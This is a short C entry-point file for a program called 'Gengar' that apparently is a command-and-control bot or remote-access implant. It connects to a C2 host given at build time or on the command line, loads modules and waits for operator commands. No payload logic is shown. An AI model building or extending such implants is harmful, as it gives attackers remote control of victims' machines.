#include <stdlib.h>
#include "commander.h"
#include "cnc.h"
#include "modules.h"
#include "logger.h"

int main(int argc, char *argv[])
{
    char *host = NULL;

#ifdef HOST
    host = HOST;
#else
    if (argc != 2)
    {
        fprintf(stderr, "usage: %s HOST", argv[0]);
        exit(EXIT_FAILURE);
    }
    host = argv[1];
#endif

    log_info("Gengar started.");
    cnc_init_conn(host);
    modules_init();
    listen_for_cmds();
}